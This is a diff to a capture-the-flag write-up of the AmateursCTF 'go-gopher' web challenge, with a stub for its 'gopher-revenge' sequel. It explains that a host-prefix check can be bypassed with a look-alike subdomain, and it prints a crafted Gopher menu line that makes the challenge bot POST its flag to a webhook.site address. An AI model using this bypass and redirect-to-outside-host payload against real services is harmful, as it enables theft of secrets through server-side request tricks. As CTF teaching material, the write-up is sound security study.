@@ -48,6 +48,8 @@ The web server is probably taking value from the cookie, and use `float()` to co
 
 ## go-gopher
 
+This challenge was cheesed with subdomains or certain domain names because it only checks the host prefix. There is a revenge challenge [gopher-revenge](#gopher-revenge).
+
 - Description:
 > psst... i know flag sharing isn't allowed, and i found this page where someone seems to be recieving flags from someone else. can you somehow find a way to hijack this site so it gives me flags? thanks.
 - Author: voxal
@@ -92,7 +94,7 @@ func Visit(url string) string {
 
 The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.
 
-The bot does restrict the host of the Gopher url to start with `amt.rs`, however this can be easily bypassed with subdomain like `gopher://amt.rs.cjxol.com:31290/`. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.
+The bot does restrict the host of the Gopher url to start with `amt.rs`, however this can be easily bypassed with subdomains like `gopher://amt.rs.cjxol.com:31290/`. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.
 
 ![go-gopher flag](/assets/image/amateursctf-web-writeup/go-gopher-flag.png)
 
@@ -125,3 +127,14 @@ iagain          error.host      1
         https://webhook.site/[reducted]       ::      31337
 .
 ```
+
+## gopher-revenge
+
+- Description:
+  > you guys are going to regret ever crossing me.
+
+  Later added the following clarification/hint due to a few teams with very close solutions fails submitting the correct flag:
+  > the flag in "flag.txt" is the exact same flag you need to submit
+- Author: voxal
+
+TODO: writeup
